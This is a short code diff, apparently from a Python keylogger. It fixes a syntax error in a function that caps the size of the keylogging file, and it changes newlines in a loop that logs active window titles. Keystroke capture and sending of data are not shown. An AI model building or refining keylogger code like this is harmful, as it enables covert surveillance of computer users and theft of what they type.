@@ -16,12 +16,12 @@ def wintitle():
     while True:
         time.sleep(0.1)
         if winmanager.gettitle() != oldtitle:
-            filemanager.logger("\n\n" + winmanager.gettitle() + "\n")
+            filemanager.logger("\n" + winmanager.gettitle() + "\n")
         oldtitle = winmanager.gettitle()
 
 # 파일 사이즈 감지(FileSizeCheck) 함수
 def FSC():
-    MAX_FILE_SIZE = 20000: # 키로깅 파일 최대 크기지정 (단위:바이트)
+    MAX_FILE_SIZE = 20000 # 키로깅 파일 최대 크기지정 (단위:바이트)
     while True:
         time.sleep(1)
         if filemanager.getfilesize() > MAX_FILE_SIZE:
